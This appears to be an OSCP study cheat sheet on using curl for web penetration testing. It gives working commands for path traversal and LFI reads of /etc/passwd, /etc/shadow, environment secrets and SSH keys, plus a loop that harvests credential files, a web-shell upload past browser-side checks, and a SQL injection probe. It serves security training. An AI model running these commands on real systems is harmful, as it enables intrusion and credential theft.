# Curl & HTTP Requests (OSCP)

Curl sends raw HTTP and shows the raw response — replicates any browser form/GET and skips browser-side validation.

---

## Path Traversal / LFI file read
```bash
curl -s --path-as-is "http://<IP>/../../../../etc/passwd"
curl -s --path-as-is "http://<IP>/../../../../proc/self/cmdline" | tr '\0' ' '
```
→ `--path-as-is` stops curl collapsing `../` before sending — required or it never reaches the server. `cmdline` is null-separated, hence `tr`. See [[LFI_RFI]].

| Target | What you get |
|---|---|
| `/etc/passwd` | users with `/bin/bash` |
| `/proc/self/cmdline` | process launch args — often `-u user -p pass` |
| `/proc/self/environ` | env-var secrets (DB creds, API keys) |
| `/etc/shadow` | hashes (needs root read) |
| `/home/<user>/.ssh/id_rsa` | reusable private key |

## Carve many files through one LFI
```bash
grep -Ril password /mnt | sed 's#^/mnt/[^/]*##' > tmp
for i in $(cat tmp); do
  curl -s --path-as-is "http://<IP>:3000/../../../../../../../../..$i" -o "$(echo "$i" | tr '/' '_')"
done
grep -Ri password .
```
→ `sed 's#^/mnt/[^/]*##'` strips the mount **and** the share's top folder → real target paths (`/etc/...`, not `/mnt/freeswitch/etc/...`). `-o` with no slash = file lands in current dir. Misses return the app page (all the same size); hits are the real files — `grep -Ri password .` finds the creds. See [[Grep]].

## Upload a shell past browser-side validation
```bash
curl -b "session=abc123" -F "file=@shell.php" http://<IP>/admin/upload
```
→ "Images only" checks usually run in JS; curl hits the server directly. `-F` = upload, `file=` = form field name.

## Download a file behind auth
```bash
curl -b "session=abc123" http://<IP>/admin/backup.zip -o backup.zip
```
→ Without the cookie you save the 302 login page. Backups → source, config creds, old passwords.

## Login / POST
```bash
curl -X POST http://<IP>/login -d "username=admin&password=test"          # form
curl -X POST http://<IP>/api/login -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"test"}'                             # JSON API
```
→ Confirm found creds against the app before reusing on SSH/FTP/WinRM. Different error for bad-user vs bad-pass = user enumeration.

## Fingerprint / debug
```bash
curl -i http://<IP>/                      # response headers (Server, X-Powered-By, Set-Cookie)
curl -L http://<IP>/                      # follow redirects
curl -v http://<IP>/admin                 # raw request (>) and response (<)
curl http://admin:password@<IP>/admin     # HTTP Basic auth in the URL
```

## SQLi handoff
```bash
curl "http://<IP>/search?q='"                # single quote → SQL error = injectable
```
→ Quote throws a SQL error = injectable. Confirm and exploit manually — see [[SQL_Injection]] (sqlmap is banned on the OSCP exam).

---

## Key Flags

| Flag | Meaning |
|---|---|
| `-s` | silent (no progress bar) |
| `-X` | HTTP method |
| `-d` | POST body (`k=v&k2=v2`) |
| `-H` | add header |
| `-F` | multipart file upload (`field=@file`) |
| `-b` | send cookies |
| `-i` | include response headers |
| `-L` | follow redirects |
| `-o` | save to file |
| `-v` | verbose (raw req/resp) |
| `--path-as-is` | don't collapse `../` (traversal) |

---

## Related Notes

- [[Web_Enum]]
- [[LFI_RFI]]
- [[SQL_Injection]]
- [[wpscan]]
- [[htaccess_Bypass]]
